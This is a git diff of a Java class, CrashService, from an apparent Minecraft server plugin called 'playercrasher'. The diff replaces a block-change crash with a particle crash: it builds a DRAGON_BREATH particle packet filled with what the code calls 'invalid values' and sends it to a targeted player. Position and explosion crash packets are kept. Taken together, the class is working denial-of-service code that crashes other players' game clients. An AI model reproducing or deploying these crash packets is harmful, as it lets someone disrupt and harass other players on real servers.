@@ -2,11 +2,12 @@ package com.deathmotion.playercrasher.services;
 
 import com.deathmotion.playercrasher.enums.CrashMethod;
 import com.github.retrooper.packetevents.PacketEvents;
+import com.github.retrooper.packetevents.protocol.particle.Particle;
+import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
 import com.github.retrooper.packetevents.util.Vector3d;
 import com.github.retrooper.packetevents.util.Vector3f;
-import com.github.retrooper.packetevents.util.Vector3i;
-import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerBlockChange;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
+import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerParticle;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
 import org.bukkit.entity.Player;
 
@@ -21,7 +22,7 @@ import java.util.function.Consumer;
 public class CrashService {
     private final WrapperPlayServerPlayerPositionAndLook positionPacket;
     private final WrapperPlayServerExplosion explosionPacket;
-    private final WrapperPlayServerBlockChange blockPacket;
+    private final WrapperPlayServerParticle particlePacket;
     private Map<CrashMethod, Consumer<Player>> crashMethodActions;
 
     /**
@@ -32,7 +33,7 @@ public class CrashService {
 
         this.positionPacket = initPositionPacket();
         this.explosionPacket = initExplosionPacket();
-        this.blockPacket = initBlockPacket();
+        this.particlePacket = initParticlePacket();
     }
 
     /**
@@ -101,12 +102,12 @@ public class CrashService {
     }
 
     /**
-     * Sends a block change packet to the targeted player.
+     * Sends a particle packet to the targeted player.
      *
      * @param target the player to receive the packet
      */
-    private void sendBlockPacket(Player target) {
-        PacketEvents.getAPI().getPlayerManager().sendPacket(target, blockPacket);
+    private void sendParticlePacket(Player target) {
+        PacketEvents.getAPI().getPlayerManager().sendPacket(target, particlePacket);
     }
 
     /**
@@ -116,7 +117,7 @@ public class CrashService {
         this.crashMethodActions = new HashMap<>();
         this.crashMethodActions.put(CrashMethod.POSITION, this::sendPositionPacket);
         this.crashMethodActions.put(CrashMethod.EXPLOSION, this::sendExplosionPacket);
-        this.crashMethodActions.put(CrashMethod.BLOCK, this::sendExplosionPacket);
+        this.crashMethodActions.put(CrashMethod.PARTICLE, this::sendParticlePacket);
     }
 
     /**
@@ -134,9 +135,9 @@ public class CrashService {
     }
 
     /**
-     * @return a new BlockChange packet with maximum values.
+     * @return a new ParticlePacket packet with invalid values.
      */
-    private WrapperPlayServerBlockChange initBlockPacket() {
-        return new WrapperPlayServerBlockChange(new Vector3i(i(), i(), i()), i());
+    private WrapperPlayServerParticle initParticlePacket() {
+        return new WrapperPlayServerParticle(new Particle(ParticleTypes.DRAGON_BREATH), true, new Vector3d(d(), d(), d()), new Vector3f(f(), f(), f()), f(), i());
     }
 }
